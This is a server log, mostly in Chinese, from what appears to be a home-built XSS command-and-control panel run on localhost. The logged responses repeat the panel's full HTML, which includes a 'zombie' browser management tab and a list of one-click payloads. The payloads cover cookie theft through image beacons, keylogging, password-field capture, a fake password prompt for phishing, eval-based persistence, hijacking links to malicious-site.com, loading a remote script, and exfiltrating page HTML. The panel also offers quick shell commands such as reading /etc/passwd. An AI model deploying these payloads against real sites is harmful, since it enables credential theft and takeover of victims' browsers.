關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:40:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:40:51] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:40:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:40:51] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:40:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:40:51] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:40:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:40:53 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:40:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:40:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:40:53] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:40:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:40:56 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:40:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0029s) -> 回傳: <Response 1237 bytes [200 OK]>
2025-06-26 22:40:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:40:56] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 22:41:01 | INFO     | control_route.py:138 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 22:41:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 22:41:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:01] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 22:41:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:01 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 22:41:01 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:01 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T14:41:01.077Z"},時間: 2025-06-26 22:41:01.085648
2025-06-26 22:41:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0060s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 22:41:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:01] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 22:41:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:41:01 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:41:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T14:41:01.077Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 22:41:01.081369</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: 